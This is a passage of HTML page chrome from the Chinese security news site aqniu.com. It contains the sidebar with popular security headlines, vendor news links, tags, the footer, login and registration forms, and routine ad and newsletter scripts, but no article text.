					<img src="//www.gravatar.com/avatar/948b2891616ed296717cd5933ceed93d?s=80&#038;r=g&#038;d=http%3A%2F%2Fwww.aqniu.com%2Fwp-content%2Fthemes%2Fanquanniu%2Fimages%2Fcomments%2Favatar2.png" class="avatar user-1-avatar avatar-80 photo" width="80" height="80" alt="aqniu的头像" />					<h5><a href="http://www.aqniu.com/author/admin" title="由aqniu发布" rel="author">aqniu</a></h5>
					<p>安全牛</p>
					<div class="social">
						<a href="#"><i class="fa fa-weibo"></i></a>
						<a href="#"><i class="fa fa-qq"></i></a>
						<a href="#"><i class="fa fa-weixin"></i></a>
						<a href="#"><i class="fa fa-tencent-weibo"></i></a>
						<a href="#"><i class="fa fa-renren"></i></a>
					</div>
				</div>
				<div class="clearfix"></div>
				<h3 class="heading-1"><span>相关文章</span></h3>
				<div class="row margin-bottom-30">
          				</div>
<!--评论开始-->
 
<div class="comments-list margin-bottom-20">
<h3 class="heading-1"><span>写一条评论</span></h3>


<div class="no-login-box ">
    <a href="#" id="user-login" class="must-log-in">登录/注册</a>后参与评论
</div>


</div>




<p>&nbsp;</p><p>&nbsp;</p>
<h3 class="heading-1"><span>0条评论</span></h3>
<div class=" margin-bottom-20">
    </div>
<!--评论结束-->
</div>
			<!-- SIDEBAR -->
			<aside class="col-md-4 col-sm-5">
  <div class="ads ad-300 margin-bottom-60">
    <!-- 广告位：post-right -->
  <script>
  (function() {
      var s = "_" + Math.random().toString(36).slice(2);
      document.write('<div id="' + s + '"></div>');
      (window.slotbydup=window.slotbydup || []).push({
          id: '4103479',
          container: s,
          size: '300,250',
          display: 'inlay-fix'
      });
  })();
  </script>
  <script src="http://dup.baidustatic.com/js/os.js"></script>
  </div>

  <!---->
  <div class="side-widget margin-bottom-20">
    <h3 class="heading-1"><span>阅读排行榜</span></h3>
    <ul class="tabcontent">
      <ol>
        
       <li><a href="http://www.aqniu.com/hack-geek/14579.html"  title="深网与暗网初学者指南">深网与暗网初学者指南</a> </li><li><a href="http://www.aqniu.com/industry/16978.html"  title="中国网络安全企业50强（2016年上半年）">中国网络安全企业50强（2016年上半年）</a> </li><li><a href="http://www.aqniu.com/hack-geek/6276.html"  title="Wifi无线网络自动钓鱼工具：WifiPhisher">Wifi无线网络自动钓鱼工具：WifiPhisher</a> </li><li><a href="http://www.aqniu.com/hack-geek/8817.html"  title="世界上最可怕的搜索引擎－－Shodan">世界上最可怕的搜索引擎－－Shodan</a> </li><li><a href="http://www.aqniu.com/industry/8116.html"  title="国内五大抗DDoS服务">国内五大抗DDoS服务</a> </li><li><a href="http://www.aqniu.com/threat-alert/25496.html"  title="利用这四个字符 任何网站都可以崩溃浏览者的 Windows 7/8">利用这四个字符 任何网站都可以崩溃浏览者的 Windows 7/8</a> </li><li><a href="http://www.aqniu.com/tools-tech/23223.html"  title="最值得推荐的5个VPN服务">最值得推荐的5个VPN服务</a> </li><li><a href="http://www.aqniu.com/industry/8096.html"  title="i春秋 一个全新的信息安全在线教育平台">i春秋 一个全新的信息安全在线教育平台</a> </li><li><a href="http://www.aqniu.com/threat-alert/25311.html"  title="“世界末日”级蠕虫永恒之石 利用7个NSA漏洞">“世界末日”级蠕虫永恒之石 利用7个NSA漏洞</a> </li><li><a href="http://www.aqniu.com/industry/11156.html"  title="《中国网络安全企业50强》重磅发布">《中国网络安全企业50强》重磅发布</a> </li>           </ol>
    </ul>
  </div>
  <!---->
  <!--安全牛作者-->
    <!--安全牛作者结束-->

  <div class="side-widget margin-bottom-20">
    <h3 class="heading-1"><span>厂商供稿</span></h3>


    <ul class="trending padding-top-30 padding-bottom-20">
                  <li>
        <div class="thumb">
          <img src="http://www.aqniu.com/wp-content/themes/anquanniu/timthumb.php?src=http://www.aqniu.com/wp-content/uploads/2017/09/BRICS.jpeg&h=70&w=105&zc=1" class="img-responsive" alt="">
        </div>
        <h4><a href="http://www.aqniu.com/vendor/27846.html">2017年金砖国家工商论坛 梆梆安全共谋网络空间战略安全</a></h4>
        <div class="meta"><span class="date">星期五, 九月 1, 2017</span></div>
      </li>
            <li>
        <div class="thumb">
          <img src="http://www.aqniu.com/wp-content/themes/anquanniu/timthumb.php?src=http://www.aqniu.com/wp-content/uploads/2017/08/瑞数.jpg&h=70&w=105&zc=1" class="img-responsive" alt="">
        </div>
        <h4><a href="http://www.aqniu.com/vendor/27803.html">对未知威胁Say No！</a></h4>
        <div class="meta"><span class="date">星期四, 八月 31, 2017</span></div>
      </li>
            <li>
        <div class="thumb">
          <img src="http://www.aqniu.com/wp-content/themes/anquanniu/timthumb.php?src=http://www.aqniu.com/wp-content/uploads/2017/08/深度威胁邮件网关.jpg&h=70&w=105&zc=1" class="img-responsive" alt="">
        </div>
        <h4><a href="http://www.aqniu.com/vendor/27597.html">上海贝岭携手亚信安全治理勒索邮件  建设主动防护体系实现零感染率</a></h4>
        <div class="meta"><span class="date">星期三, 八月 23, 2017</span></div>
      </li>
            <li>
        <div class="thumb">
          <img src="http://www.aqniu.com/wp-content/themes/anquanniu/timthumb.php?src=http://www.aqniu.com/wp-content/uploads/2017/08/郑敦隆.jpg&h=70&w=105&zc=1" class="img-responsive" alt="">
        </div>
        <h4><a href="http://www.aqniu.com/vendor/27593.html">郑敦隆出任Forcepoint全球副总裁</a></h4>
        <div class="meta"><span class="date">星期三, 八月 23, 2017</span></div>
      </li>
            <li>
        <div class="thumb">
          <img src="http://www.aqniu.com/wp-content/themes/anquanniu/timthumb.php?src=http://www.aqniu.com/wp-content/uploads/2017/08/互联网业务安全的主要威胁.jpg&h=70&w=105&zc=1" class="img-responsive" alt="">
        </div>
        <h4><a href="http://www.aqniu.com/vendor/27498.html">企业业务安全损失高达4450亿美元，如何才能力挽狂澜？</a></h4>
        <div class="meta"><span class="date">星期四, 八月 17, 2017</span></div>
      </li>
      
    </ul>
  </div>


      <div id="widget-author-right" class="widget-area" role="complementary">
      <aside id="text-15" class="widget widget_text">			<div class="textwidget"><div class="layout_2 margin-bottom-15">
                <h3 class="heading-1"><span>安全牛作者</span></h3>
                <div class="row">
                <!--作者开始-->
                  <div class="col-md-4 col-sm-6">
                    <div class="layout_3--item">
                      <div class="thumb margin-bottom-10">
                        <a href="http://www.aqniu.com/author/wangmeng"><img src="http://www.aqniu.com/wp-content/uploads/2013/12/wangmeng50-150x150.png" class="img-responsive" alt=""/>
                        <span class="cat">王萌</span></a>
                      </div>
                    </div>
                  </div>
                  <!--作者结束-->
                  <!--作者开始-->
                  <div class="col-md-4 col-sm-6">
                    <div class="layout_3--item">
                      <div class="thumb margin-bottom-10">
                        <a href="http://www.aqniu.com/author/liuchaoyang"><img src="http://www.aqniu.com/wp-content/uploads/2013/12/liuchaoyang-150x150.jpg" class="img-responsive" alt=""/>
                        <span class="cat">刘朝阳</span></a>
                      </div>
                    </div>
                  </div>
                  <!--作者结束-->
                  <!--作者开始-->
                  <div class="col-md-4 col-sm-6">
                    <div class="layout_3--item">
                      <div class="thumb margin-bottom-10">
                        <a href="http://www.aqniu.com/author/steve-mushhero"><img src="http://www.aqniu.com/wp-content/uploads/2013/12/SteveMushero-150x150.jpg" class="img-responsive" alt=""/>
                        <span class="cat">Steve Mushero</span></a>
                      </div>
                    </div>
                  </div>
                  <!--作者结束-->
                  <!--作者开始-->
                  <div class="col-md-4 col-sm-6">
                    <div class="layout_3--item">
                      <div class="thumb margin-bottom-10">
                        <a href="http://www.aqniu.com/author/rik-ferguson"><img src="http://www.aqniu.com/wp-content/uploads/2013/12/rikferguson-150x150.jpg" class="img-responsive" alt=""/>
                        <span class="cat">Rik Ferguson</span></a>
                      </div>
                    </div>
                  </div>
                  <!--作者结束-->
                  <!--作者开始-->
                  <div class="col-md-4 col-sm-6">
                    <div class="layout_3--item">
                      <div class="thumb margin-bottom-10">
                        <a href="http://www.aqniu.com/author/recco1"><img src="http://www.aqniu.com/wp-content/uploads/2015/02/5.jpg" class="img-responsive" alt=""/>
                          <span class="cat">王小瑞</span></a>
                      </div>
                    </div>
                  </div>
                  <!--作者结束-->
                  <div class="col-md-4 col-sm-6">
                  </div>
                </div>
              </div></div>
		</aside>    </div><!-- .widget-area -->
  


  <div class="side-widget margin-bottom-60">
    <h3 class="heading-1"><span>热门标签</span></h3>
    <ul class="tags">
      <a href="http://www.aqniu.com/tag/%e5%ae%89%e5%85%a8%e6%bc%8f%e6%b4%9e" class="tag-cloud-link tag-link-288 tag-link-position-1" style="font-size: 14px;">安全漏洞</a>
<a href="http://www.aqniu.com/tag/%e6%95%b0%e6%8d%ae%e6%b3%84%e9%9c%b2" class="tag-cloud-link tag-link-161 tag-link-position-2" style="font-size: 14px;">数据泄露</a>
<a href="http://www.aqniu.com/tag/%e4%b8%aa%e4%ba%ba%e4%bf%a1%e6%81%af%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-328 tag-link-position-3" style="font-size: 14px;">个人信息安全</a>
<a href="http://www.aqniu.com/tag/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-139 tag-link-position-4" style="font-size: 14px;">移动安全</a>
<a href="http://www.aqniu.com/tag/%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-283 tag-link-position-5" style="font-size: 14px;">网络安全</a>
<a href="http://www.aqniu.com/tag/%e7%bd%91%e7%bb%9c%e7%8a%af%e7%bd%aa" class="tag-cloud-link tag-link-164 tag-link-position-6" style="font-size: 14px;">网络犯罪</a>
<a href="http://www.aqniu.com/tag/nsa" class="tag-cloud-link tag-link-115 tag-link-position-7" style="font-size: 14px;">NSA</a>
<a href="http://www.aqniu.com/tag/%e4%ba%91%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-181 tag-link-position-8" style="font-size: 14px;">云安全</a>
<a href="http://www.aqniu.com/tag/%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6" class="tag-cloud-link tag-link-284 tag-link-position-9" style="font-size: 14px;">恶意软件</a>
<a href="http://www.aqniu.com/tag/%e5%8b%92%e7%b4%a2%e8%bd%af%e4%bb%b6" class="tag-cloud-link tag-link-366 tag-link-position-10" style="font-size: 14px;">勒索软件</a>
<a href="http://www.aqniu.com/tag/%e9%9a%90%e7%a7%81%e4%bf%9d%e6%8a%a4" class="tag-cloud-link tag-link-193 tag-link-position-11" style="font-size: 14px;">隐私保护</a>
<a href="http://www.aqniu.com/tag/%e7%89%a9%e8%81%94%e7%bd%91%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-224 tag-link-position-12" style="font-size: 14px;">物联网安全</a>
<a href="http://www.aqniu.com/tag/ddos" class="tag-cloud-link tag-link-289 tag-link-position-13" style="font-size: 14px;">DDoS</a>
<a href="http://www.aqniu.com/tag/%e9%bb%91%e5%ae%a2" class="tag-cloud-link tag-link-341 tag-link-position-14" style="font-size: 14px;">黑客</a>
<a href="http://www.aqniu.com/tag/%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5" class="tag-cloud-link tag-link-1541 tag-link-position-15" style="font-size: 14px;">威胁情报</a>
<a href="http://www.aqniu.com/tag/%e5%ae%89%e5%85%a8%e7%ae%a1%e7%90%86" class="tag-cloud-link tag-link-160 tag-link-position-16" style="font-size: 14px;">安全管理</a>
<a href="http://www.aqniu.com/tag/%e5%ae%89%e5%85%a8%e6%84%8f%e8%af%86" class="tag-cloud-link tag-link-235 tag-link-position-17" style="font-size: 14px;">安全意识</a>
<a href="http://www.aqniu.com/tag/%e8%8b%b9%e6%9e%9c" class="tag-cloud-link tag-link-110 tag-link-position-18" style="font-size: 14px;">苹果</a>
<a href="http://www.aqniu.com/tag/%e5%b7%a5%e6%8e%a7%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-993 tag-link-position-19" style="font-size: 14px;">工控安全</a>
<a href="http://www.aqniu.com/tag/web%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-107 tag-link-position-20" style="font-size: 14px;">WEB安全</a>    </ul>
    <div class="clearfix"></div>
  </div>

</aside>
			<!-- // SIDEBAR -->
		</div>
	</div>
	<!-- // CONTENT -->
<!-- FOOTER -->
<footer class="bg-dark footer1 padding-top-60">
	<div class="container">
		<div class="row margin-bottom-30">
			<div class="col-md-4 col-sm-4 margin-bottom-30 footer-info">
				<a href="http://www.aqniu.com"><img src="http://www.aqniu.com/wp-content/themes/anquanniu/images/aqniu-logo.svg" class="img-responsive" alt=""/></a>
				<p>安全牛网是国内首家定位于企业级信息安全市场的专业新媒体，团队由顶尖信息安全专家、IT风险管理顾问和资深IT媒体人士组成。</p>
				<span><i class="fa fa-map-marker"></i>北京中关村数码大厦</span>
				<span><i class="fa fa-envelope"></i> <a href="#">info@aqniu.com</a></span>

			</div>

			<div class="col-md-4 col-sm-4 margin-bottom-30 footer-trending">
				<h5>友情链接</h5>
				<ul class="trending">
 | <a target="_blank" href="http://edu.aqniu.com" title="安全课堂">安全课堂</a> | <a target="_blank" href="http://www.zhizhangyi.com" title="指掌易">指掌易</a>				</ul>
			</div>

			<div class="col-md-4 col-sm-4 margin-bottom-30 footer-follow">
				<h5>关注安全牛</h5>
				<div class="footer-newsletter">
					<script type="text/javascript">(function() {
	if (!window.mc4wp) {
		window.mc4wp = {
			listeners: [],
			forms    : {
				on: function (event, callback) {
					window.mc4wp.listeners.push({
						event   : event,
						callback: callback
					});
				}
			}
		}
	}
})();
</script><!-- MailChimp for WordPress v4.1.3 - https://wordpress.org/plugins/mailchimp-for-wp/ --><form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-18603 mc4wp-form-theme mc4wp-form-theme-blue" method="post" data-id="18603" data-name="Default sign-up form" ><div class="mc4wp-form-fields">
<i class="fa fa-envelope"></i>
							<input type="email" placeholder="请输入邮件地址订阅" class="e-mail" id="mc4wp_email" name="EMAIL" ">
							<button type="submit">邮件订阅</button><div style="display: none;"><input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off" /></div><input type="hidden" name="_mc4wp_timestamp" value="1505790360" /><input type="hidden" name="_mc4wp_form_id" value="18603" /><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1" /></div><div class="mc4wp-response"></div></form><!-- / MailChimp for WordPress Plugin -->					<p>&nbsp;</p>
					<span>欢迎订阅安全牛邮件列表</span>
					<div id="result1"></div>
				</div>
				<div class="footer-social">
					<a href="#"><i class="fa fa-tencent-weibo"></i></a>
					<a href="#"><i class="fa fa-weibo"></i></a>
					<a href="#"><i class="fa fa-weixin"></i></a>
					<a href="#"><i class="fa fa-qq"></i></a>
					<a href="#"><i class="fa fa-renren"></i></a>
				</div>
			</div>
		</div>
		<!-- FOOTER COPYRIGHT -->
		<div class="footer-bottom">
			<div class="row">
				<div class="col-md-4 col-sm-12">
					<p>&copy; Copyright 2017 aqniu.com. <span class="foot-cnzz"><script src="https://s96.cnzz.com/z_stat.php?id=1000200880&web_id=1000200880" language="JavaScript"></script></span>
						<br><spna class="foot-icp"><a href="http://www.miitbeian.gov.cn/" target="_blank">京ICP备13013886号-3&nbsp;&nbsp;京ICP证161293号</a></span></p>
				</div>
				<div class="col-md-8 col-sm-12">
					<ul class="footer-links">
						<li><a href="http://www.aqniu.com/about/">关于我们</a></li>
						<li><a href="http://www.aqniu.com/contact-us">联系我们</a></li>
						<li><a href="http://www.aqniu.com/adserver">广告服务</a></li>
						<li><a href="http://www.aqniu.com/email">订阅服务</a></li>
						<li><a href="http://www.aqniu.com/privacy-policy">隐私条款</a></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</footer>
<!-- // FOOTER -->
</div>
<script type="text/javascript" src="http://www.aqniu.com/wp-content/themes/anquanniu/js/jquery-1.8.3.min.js"></script>
<script type="text/javascript" src="http://www.aqniu.com/wp-content/themes/anquanniu/js/sucaijiayuan.js"></script>
<div class="top_bottom_tools">
  <div class="qr_tool">二维码</div>
  <a id="feedback" href="http://www.aqniu.com/contact-us" title="我要投稿">我要投稿</a>
  <a id="scrollUp" href="javascript:;" title="飞回顶部"></a>
  <img class="qr_img" src="http://www.aqniu.com/wp-content/themes/anquanniu/images/qr_img.png">
</div>
<div id="sign" class="sign animated">
    <div class="part loginPart">
      <div class="login-header">
        <h3>登录</h3>
        <div id="register-active" class="switch"><i class="fa fa-toggle-on"></i>注册</div>
      </div>
        <form id="login" action="http://www.aqniu.com/wp-login.php" method="post" novalidate="novalidate">
						<div class="input-group">
							<p class="status"></p>
							<i class="fa fa-user"></i>
							<input class="input-control" id="username" type="text" placeholder="请输入用户名或邮箱地址" name="username" required="" aria-required="true">
							<i class="fa fa-lock"></i>
							<input class="input-control" id="password" type="password" placeholder="请输入密码" name="password" required="" aria-required="true">
						</div>
                <p class="safe">
                    <label class="remembermetext" for="rememberme"><input name="rememberme" type="checkbox" checked="checked" id="rememberme" class="rememberme" value="forever">记住我的登录</label>
                    <a href="http://www.aqniu.com/wp-login.php?action=lostpassword" class="pwd-forget">忘记密码</a>
                </p>
                <input class="submit" type="submit" value="登录" name="submit">
                <a class="close"><i class="fa fa-times"></i></a>
                <input type="hidden" id="security" name="security" value="e577160b3f">
                <input type="hidden" name="_wp_http_referer" value="/hack-geek/13128.html">
        </form>
    </div>
    <div class="part registerPart">
      <div class="login-header">
        <h3>注册</h3>
        <div id="login-active" class="switch"><i class="fa fa-toggle-off"></i>登录</div>
      </div>
        <form id="register" action="http://www.aqniu.com/wp-login.php?action=register" method="post" novalidate="novalidate">
        <p class="status"></p>
        <div class="input-group">
          <i class="fa fa-user"></i>
          <input class="input-control" id="user_name" type="text" name="user_name" placeholder="输入用户名" required="" aria-required="true">
          <i class="fa fa-envelope"></i>
          <input class="input-control" id="user_email" type="text" name="user_email" placeholder="输入常用邮箱" required="" aria-required="true">
          <i class="fa fa-lock"></i>
          <input class="input-control" id="user_pass" type="password" name="user_pass" placeholder="密码最小长度为6" required="" aria-required="true">
          <i class="fa fa-retweet"></i>
          <input class="input-control" type="password" id="user_pass2" name="user_pass2" placeholder="再次输入密码" required="" aria-required="true">
          <input class="submit" type="submit" value="注册" name="submit">
        </div>
        <a class="close"><i class="fa fa-times"></i></a>
        <input type="hidden" id="user_security" name="user_security" value="77b00cd8ad"><input type="hidden" name="_wp_http_referer" value="/hack-geek/13128.html">
        </form>
    </div>
  </div>
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/ajax-sign-script.min.js"></script>
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/custom_hj.js"></script>
<script type="text/javascript">
/* <![CDATA[ */
var ajax_sign_object = {"redirecturl":"http:\/\/www.aqniu.com\/hack-geek\/13128.html","ajaxurl":"http:\/\/www.aqniu.com\/wp-admin\/admin-ajax.php","loadingmessage":"\u6b63\u5728\u8bf7\u6c42\u4e2d\uff0c\u8bf7\u7a0d\u7b49..."};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/themes/anquanniu/ajax-comment/app.js'></script>
<!-- Bootstrap Core JavaScript -->
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/bootstrap.min.js"></script>
<!-- Plugin JavaScript -->
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/slick/slick.min.js"></script>
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/socialShare.min.js"></script>
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/lity/lity.min.js"></script>
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/main.js"></script>
<!-- Mailchimp Js -->
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/mc/jquery.ketchup.all.min.js"></script>
<script src="http://www.aqniu.com/wp-content/themes/anquanniu/js/mc/main.js"></script>
<script>
 $(function () {
		$('#myTab li:eq(0) a').tab('show');
 });
</script>
<script type="text/javascript">(function() {function addEventListener(element,event,handler) {
	if(element.addEventListener) {
		element.addEventListener(event,handler, false);
	} else if(element.attachEvent){
		element.attachEvent('on'+event,handler);
	}
}function maybePrefixUrlField() {
	if(this.value.trim() !== '' && this.value.indexOf('http') !== 0) {
		this.value = "http://" + this.value;
	}
}

var urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]');
if( urlFields && urlFields.length > 0 ) {
	for( var j=0; j < urlFields.length; j++ ) {
		addEventListener(urlFields[j],'blur',maybePrefixUrlField);
	}
}/* test if browser supports date fields */
var testInput = document.createElement('input');
testInput.setAttribute('type', 'date');
if( testInput.type !== 'date') {

	/* add placeholder & pattern to all date fields */
	var dateFields = document.querySelectorAll('.mc4wp-form input[type="date"]');
	for(var i=0; i<dateFields.length; i++) {
		if(!dateFields[i].placeholder) {
			dateFields[i].placeholder = 'YYYY-MM-DD';
		}
		if(!dateFields[i].pattern) {
			dateFields[i].pattern = '[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])';
		}
	}
}

})();</script><script type='text/javascript' src='http://www.aqniu.com/wp-includes/js/jquery/jquery.form.min.js?ver=3.37.0'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ajaxcomment = {"ajax_url":"http:\/\/www.aqniu.com\/wp-admin\/admin-ajax.php","order":"desc","formpostion":"bottom"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/themes/anquanniu/ajax-comment/app.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/page-links-to/js/new-tab.min.js?ver=2.9.8'></script>
<script type='text/javascript' src='http://www.aqniu.com/wp-includes/js/wp-embed.min.js?ver=4.8.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var mc4wp_forms_config = [];
/* ]]> */
</script>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/mailchimp-for-wp/assets/js/forms-api.min.js?ver=4.1.3'></script>
<!--[if lte IE 9]>
<script type='text/javascript' src='http://www.aqniu.com/wp-content/plugins/mailchimp-for-wp/assets/js/third-party/placeholders.min.js?ver=4.1.3'></script>
<![endif]-->
</body>
</html>
